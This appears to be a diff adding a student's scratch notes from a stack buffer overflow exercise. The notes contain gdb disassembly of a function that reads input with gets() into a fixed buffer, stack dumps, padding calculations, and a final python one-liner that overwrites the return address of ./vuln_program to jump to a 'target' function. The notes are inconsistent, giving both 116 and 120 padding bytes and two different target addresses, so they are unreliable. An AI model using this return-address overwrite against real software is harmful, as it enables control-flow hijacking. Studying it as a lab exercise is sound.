@@ -1,0 +1,127 @@
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+
+Dump of assembler code for function prompt:
+   0x0000000000400aae <+0>:	push   %rbp
+   0x0000000000400aaf <+1>:	mov    %rsp,%rbp
+   0x0000000000400ab2 <+4>:	sub    $0x70,%rsp -------->x70 bytes or 112 reserved for local mem
+
+   0x0000000000400ab6 <+8>:	lea    -0x70(%rbp),%rax
+   0x0000000000400aba <+12>:	mov    %rax,%rdi
+   0x0000000000400abd <+15>:	mov    $0x0,%eax
+   0x0000000000400ac2 <+20>:	callq  0x407ec0 <gets>
+   0x0000000000400ac7 <+25>:	lea    -0x70(%rbp),%rax	-------> buffer starts 112 bytes before stack base pointer
+   0x0000000000400acb <+29>:	mov    %rax,%rsi
+   0x0000000000400ace <+32>:	lea    0x8916f(%rip),%rdi        # 0x489c44
+   0x0000000000400ad5 <+39>:	mov    $0x0,%eax
+   0x0000000000400ada <+44>:	callq  0x4076f0 <printf>
+   0x0000000000400adf <+49>:	nop
+   0x0000000000400ae0 <+50>:	leaveq 
+   0x0000000000400ae1 <+51>:	retq   
+
+
+Dump of assembler code for function prompt:
+4	void prompt(){
+	   0x0000000000400aae <+0>:	push   %rbp
+	   0x0000000000400aaf <+1>:	mov    %rsp,%rbp
+	   0x0000000000400ab2 <+4>:	sub    $0x70,%rsp
+
+5		char buf[100];
+6	
+7		gets(buf);
+		   0x0000000000400ab6 <+8>:	lea    -0x70(%rbp),%rax
+		   0x0000000000400aba <+12>:	mov    %rax,%rdi
+		   0x0000000000400abd <+15>:	mov    $0x0,%eax
+		   0x0000000000400ac2 <+20>:	callq  0x407ec0 <gets>
+
+8		printf("You entered: %s\n", buf);
+		   0x0000000000400ac7 <+25>:	lea    -0x70(%rbp),%rax
+		   0x0000000000400acb <+29>:	mov    %rax,%rsi
+		   0x0000000000400ace <+32>:	lea    0x8916f(%rip),%rdi        # 0x489c44
+		   0x0000000000400ad5 <+39>:	mov    $0x0,%eax
+		   0x0000000000400ada <+44>:	callq  0x4076f0 <printf>
+		
+
+9	
+10	}
+(gdb) x/32xw $sp
+0x7fffffffe5c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe5d0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe5e0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe5f0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe600:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe610:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe620:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe630:	0x61616161	0x00616161	0x00000000
+
+
+
+0x7fffffffe640
+0x00400af0
+
+Dump of assembler code for function main:
+   0x0000000000400ae2 <+0>:	push   %rbp
+   0x0000000000400ae3 <+1>:	mov    %rsp,%rbp
+   0x0000000000400ae6 <+4>:	mov    $0x0,%eax
+   0x0000000000400aeb <+9>:	callq  0x400aae <prompt>
+   0x 00|00|00|00 00|40|0a|f0 <+14>:	mov    $0x0,%eax
+   0x0000000000400af5 <+19>:	pop    %rbp
+   0x0000000000400af6 <+20>:	retq   
+End of assembler dump.
+
+
+gdb) x/32xw $sp
+0x7fffffffe5c0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe5d0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe5e0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe5f0:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe600:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe610:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe620:	0x61616161	0x61616161	0x61616161	0x61616161
+0x7fffffffe630:	0x61616161	0x61616161	0x00400a00	0x00000000
+
+
+
+Dump of assembler code for function target:
+   0x0000000000400af7 <+0>:	push   %rbp
+   0x0000000000400af8 <+1>:	mov    %rsp,%rbp
+   0x0000000000400afb <+4>:	lea    0x89153(%rip),%rdi        # 0x489c55
+   0x0000000000400b02 <+11>:	callq  0x408080 <puts>
+   0x0000000000400b07 <+16>:	mov    $0x0,%edi
+   0x0000000000400b0c <+21>:	callq  0x406db0 <exit>
+
+\40\af\f7
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@»≈ 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa≈»@
+
+112 + 4 = 116 padding bytes
+
+00000000 <target>:
+00\40\0a\f7
+\f7\0a\40\00
+python -c 'print "a"*120 + "\x9f\x10\x40"' | r
+
+0 40 10 9f
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
+@
+
+00 40 0a f7
+
+//Final program
+python -c 'print "a"*120 + "\x9f\x10\x40"' | ./vuln_program
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
